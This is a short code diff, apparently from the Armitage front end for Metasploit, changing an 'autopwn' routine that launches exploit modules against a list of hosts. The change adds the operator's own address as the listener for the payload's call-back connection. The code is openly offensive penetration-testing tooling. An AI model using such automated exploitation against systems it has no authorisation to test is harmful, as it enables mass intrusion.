@@ -238,7 +238,7 @@ sub smarter_autopwn {
 
 				[$progress setNote: "$host $+ : $+ $rport ( $+ $ex $+ )"];
 				[$progress setProgress: $x + 0];
-				call_async($client, "module.execute", "exploit", $ex, %(PAYLOAD => $payload, RHOST => $host, LPORT => randomPort() . '', RPORT => "$rport", TARGET => '0', SSL => iff($rport == 443, '1')));
+				call_async($client, "module.execute", "exploit", $ex, %(PAYLOAD => $payload, RHOST => $host, LHOST => $MY_ADDRESS, LPORT => randomPort() . '', RPORT => "$rport", TARGET => '0', SSL => iff($rport == 443, '1')));
 				%wait[$host] = ticks();
 				$x++; 
 				@attacks = sublist(@attacks, 1);
